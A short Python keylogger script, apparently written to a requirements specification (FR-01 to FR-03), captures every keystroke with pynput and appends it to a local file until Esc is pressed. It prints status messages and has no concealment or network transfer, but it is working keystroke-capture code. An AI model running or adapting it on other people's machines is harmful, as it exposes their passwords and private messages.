import pynput
from pynput import keyboard
import datetime

# Configuration (FR-02.1)
log_file = "keylog.txt"

def on_press(key):
    """
    Callback function triggered whenever a key is pressed.
    Meets FR-01 (Keystroke Capture).
    """
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # We open the file in 'append' mode to add new keys without overwriting
    # Meets FR-02.2 (Append in real-time)
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            # Attempt to write the alphanumeric character (FR-01.1)
            f.write(key.char)
        except AttributeError:
            # Handle special keys (Space, Enter, Shift, etc.) (FR-01.3)
            if key == keyboard.Key.space:
                f.write(" ")  # Add a real space instead of 'Key.space'
            elif key == keyboard.Key.enter:
                f.write("\n") # Add a new line
            elif key == keyboard.Key.tab:
                f.write("\t") 
            else:
                # For other special keys, log them clearly e.g. [Key.shift]
                f.write(f" [{key}] ")

def on_release(key):
    """
    Callback function triggered whenever a key is released.
    Used primarily to stop the program.
    """
    # Meets FR-03.2 (Kill Switch)
    if key == keyboard.Key.esc:
        print(f"\n[+] Execution stopped. Logs saved to {log_file}")
        return False # Returning False stops the listener

# Main Execution
if __name__ == "__main__":
    print(f"[+] Keylogger started. Recording to '{log_file}'...")
    print("[+] Press 'Esc' to stop the logger.")
    
    # Meets FR-03.1 (Manual Start via Listener)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()